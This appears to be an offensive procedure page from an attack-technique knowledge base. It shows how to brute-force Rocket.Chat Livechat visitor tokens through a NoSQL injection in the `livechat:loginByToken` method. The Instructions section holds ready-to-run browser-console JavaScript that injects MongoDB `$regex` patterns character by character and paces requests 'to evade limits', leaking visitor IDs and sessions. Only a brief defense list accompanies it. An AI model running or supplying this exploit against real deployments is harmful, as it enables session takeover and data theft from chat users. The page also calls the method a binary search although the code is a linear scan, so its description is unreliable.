---
tags:
  - nosql-injection
  - bruteforce
  - token-leak
type: procedure
tools:
  - '[[tools/Web-Inspector]]'
tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
commands:
  - '[[commands/meteor-call-livechat-loginbytoken-regex]]'
verified: false
platforms:
  - Web
  - MongoDB
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data from Information Repositories]]'
updated_at: '2025-12-14T03:46:25.824Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 7fffce07-0c93-491f-afd2-404683fc882b
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Data from Information Repositories]]'
---
# Bruteforce-Visitor-Token-via-NoSQL-Injection

## Summary

This procedure exploits a NoSQL injection in the pre-authentication `livechat:loginByToken` method to bruteforce a valid visitor token using MongoDB `$regex` operators, enabling unauthorized access to visitor sessions.

## Description

The `token` parameter in `livechat:loginByToken` lacks string validation, allowing injection of MongoDB query operators. By crafting regex patterns like `{"$regex": "^prefix[chars]"}`, an attacker performs a binary search on the 17-character hex token (pool: '0123456789abcdef') at ~4 req/s. Success leaks the visitor `_id` and token for further exploitation. Prerequisites include access to the Livechat page and Web Inspector.

## Requirements

1. Loaded Rocket.Chat Livechat page.
2. Browser console access.
3. Knowledge of token format (17 hex chars).

## Defense

Defensive measures and detection strategies:

- Validate `token` as strict string in server-side code.
- Implement rate limiting on login attempts.
- Log and monitor anomalous regex queries in MongoDB.

## Objectives

1. Inject regex to guess token characters iteratively.
2. Obtain full valid token.
3. Access visitor object.

## Instructions

### Step 1: Prepare Bruteforce Script

**Context**: Set up variables for binary search on token prefix and character guesses.

In console, define:

```javascript
let knownValid = '';
let position = 0;
const charset = '0123456789abcdef';
const tokenLength = 17;
```

> Initializes the guessing logic.

### Step 2: Execute Iterative Guesses

**Context**: Run the core injection using [[commands/meteor-call-livechat-loginbytoken-regex]] to test patterns.

Execute the loop:

**Command** ([[commands/meteor-call-livechat-loginbytoken-regex]]):
```javascript
// Loop for each position
for (let i = 0; i < tokenLength; i++) {
  for (let guess of charset) {
    let payload = {"$regex": `^${knownValid}${guess}`};
    let result = Meteor.call('livechat:loginByToken', payload);
    if (result && result._id) {
      knownValid += guess;
      break;
    }
  }
}
```

> On match, `result` includes visitor `_id`; build `knownValid` to full token. Rate: ~4/sec to evade limits.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Collection]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[Data from Information Repositories]]

### Sub-Techniques


## Commands Used

- [[commands/meteor-call-livechat-loginbytoken-regex]]

## Tools Used

- [[tools/Web-Inspector]]

## Tags

- nosql-injection
- bruteforce
- token-leak
